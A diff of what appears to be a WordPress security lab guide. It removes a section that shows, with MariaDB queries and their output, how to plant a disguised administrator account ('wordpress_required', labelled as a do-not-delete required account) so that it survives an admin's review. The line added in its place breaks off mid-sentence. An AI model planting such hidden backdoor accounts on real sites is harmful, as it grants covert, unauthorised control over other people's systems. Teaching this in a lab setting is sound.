@@ -93,83 +93,11 @@ From here... we could change the admin password so that we can always log in as 
 - Verify you have access by visiting this admin login URL and logging in with your new credentials.
   * http://rhel1.example.com/wp-admin/
 
-## The slightly less easy but more sneaky way
+WOW.  We are in!  Verify by logging in as our admin account.  The main thing we're pointing out here is the fact that 
 
-We have already gained access to WordPress by changing the admin password.  But we want to see how we would do this a bit more covertly.  So instead, let's create an inocuous account that we know the credentials to access.  In the database queries above, we see two tables worth of information that link together.  `wp_users` and `wp_usermeta`
-
-- While we're in the MySQL database, let's add a user that appears to belong there, but does not.  We will make this our personal login with the username: "wordpress_required".  The idea is that a novice admin will likely not delete a user account that's required.
-
-First, we insert a brand new login:
-
-```INSERT into wp_users SET user_login='wordpress_required',user_pass=MD5('FluffyBunny'),user_nicename='Do_Not_Delete_REQUIRED-ACCOUNT';```
-
-<pre>
-MariaDB [WordPress]> INSERT into wp_users SET user_login='wordpress_required',user_pass=MD5('FluffyBunny'),user_nicename='Do_Not_Delete_REQUIRED-ACCOUNT';
-Query OK, 1 row affected (0.00 sec)
-
-MariaDB [WordPress]> 
-</pre>
-
-Now, let's confirm this user was created:
-
-```select ID,user_login,user_pass,user_nicename from wp_users;```
-
-Here's what it looks like:
-
-<pre>
-MariaDB [WordPress]> select ID,user_login,user_pass,user_nicename from wp_users;
-+----+--------------------+------------------------------------+--------------------------------+
-| ID | user_login         | user_pass                          | user_nicename                  |
-+----+--------------------+------------------------------------+--------------------------------+
-|  1 | admin              | $P$Bha6OJvmFvFqF7U6VtpPtkDwf0FEgj1 | admin                          |
-|  2 | wordpress_required | 548e433bb693edbf70e56bee209cb09f   | Do_Not_Delete_REQUIRED-ACCOUNT |
-+----+--------------------+------------------------------------+--------------------------------+
-2 rows in set (0.00 sec)
-
-MariaDB [WordPress]> 
-</pre>
-
-Our new "wordpress_required" account has been created with our password "FluffyBunny".  The user_nicename is set to an ambiguous message that would make a novice administrator hesitant to delete that account.
-
-With that output, we see that the new user ID in the far left column is 2.  Now we also need to insert a record into the user access table called *wp_usermeta*.  We don't really need to know what this coded data means.  We're just going to duplicate the record for the "admin" user and set it for our account.  The default admin user has a key of: `a:1:{s:13:"administrator";b:1;}` in the wp_usermeta table for the value of `wp_capabilities`.
-
-Run this query to give our new user permissions to match the default administrator.
-
-```INSERT into wp_usermeta SET user_id='2',meta_key='wp_capabilities',meta_value='a:1:{s:13:"administrator";b:1;}';```
-
-<pre>
-MariaDB [WordPress]> INSERT into wp_usermeta SET user_id='2',meta_key='wp_capabilities',meta_value='a:1:{s:13:"administrator";b:1;}';
-Query OK, 1 row affected (0.00 sec)
-
-MariaDB [WordPress]> select * from wp_usermeta WHERE meta_key = 'wp_capabilities';
-+----------+---------+-----------------+---------------------------------+
-| umeta_id | user_id | meta_key        | meta_value                      |
-+----------+---------+-----------------+---------------------------------+
-|       11 |       1 | wp_capabilities | a:1:{s:13:"administrator";b:1;} |
-|       40 |       2 | wp_capabilities | a:1:{s:13:"administrator";b:1;} |
-+----------+---------+-----------------+---------------------------------+
-2 rows in set (0.00 sec)
-
-MariaDB [WordPress]> 
-</pre>
-
-WOW.  We are in!  Verify by logging in as our new account.  You may have to log out if you're already logged in as admin.
-
-- The new administrator user for this WordPress instance is now set to:
-  * login: `wordpress_required`
-  * password:  `FluffyBunny`
-
-- Verify you have access by visiting this admin login URL and logging in with your new credentials.
-  * http://rhel1.example.com/wp-admin/
 
 - For now, get out of the MySQL prompt...
 - Type "exit" to leave the MySQL prompt and return back to a regular command line.
-
-
-
-
-
-
 
 
 
